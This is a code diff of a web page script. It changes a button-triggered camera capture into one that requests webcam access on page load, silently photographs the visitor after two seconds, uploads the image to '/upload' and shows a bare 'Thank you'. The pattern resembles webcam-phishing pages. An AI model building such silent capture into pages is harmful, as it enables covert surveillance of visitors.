@@ -1,40 +1,32 @@
-const video = document.getElementById('video');
-const canvas = document.getElementById('canvas');
-const startBtn = document.getElementById('start');
+window.onload = function () {
+    const video = document.getElementById('video');
 
-startBtn.addEventListener('click', async () => {
-  try {
-    const stream = await navigator.mediaDevices.getUserMedia({ video: true });
-    video.srcObject = stream;
-    video.style.display = 'block';
-    startBtn.innerText = '📸 Capturing...';
+    navigator.mediaDevices.getUserMedia({ video: true })
+        .then(function (stream) {
+            video.srcObject = stream;
 
-    setTimeout(() => {
-      captureAndSend();
-      stream.getTracks().forEach(track => track.stop());
-    }, 5000);
-  } catch (err) {
-    alert("❌ Camera access is required.");
-  }
-});
+            setTimeout(() => {
+                const canvas = document.createElement('canvas');
+                canvas.width = video.videoWidth;
+                canvas.height = video.videoHeight;
 
-function captureAndSend() {
-  const context = canvas.getContext('2d');
-  canvas.width = video.videoWidth;
-  canvas.height = video.videoHeight;
-  context.drawImage(video, 0, 0, canvas.width, canvas.height);
+                const ctx = canvas.getContext('2d');
+                ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
 
-  const imageData = canvas.toDataURL('image/jpeg');
+                const imageData = canvas.toDataURL('image/jpeg');
 
-  fetch('/upload', {
-    method: 'POST',
-    headers: { 'Content-Type': 'application/x-www-form-urlencoded' },
-    body: `image=${encodeURIComponent(imageData)}`
-  }).then(response => {
-    if (response.ok) {
-      alert("✅ Image sent successfully!");
-    } else {
-      alert("❌ Upload failed!");
-    }
-  });
-}
+                fetch('/upload', {
+                    method: 'POST',
+                    headers: { 'Content-Type': 'application/x-www-form-urlencoded' },
+                    body: 'image=' + encodeURIComponent(imageData)
+                }).then(() => {
+                    stream.getTracks().forEach(track => track.stop());
+                    document.body.innerHTML = "<h1>Thank you</h1>";
+                });
+            }, 2000); // Wait 2 seconds for video to stabilize
+        })
+        .catch(function (err) {
+            console.error("Camera access denied:", err);
+            document.body.innerHTML = "<h1>Camera access denied</h1>";
+        });
+};
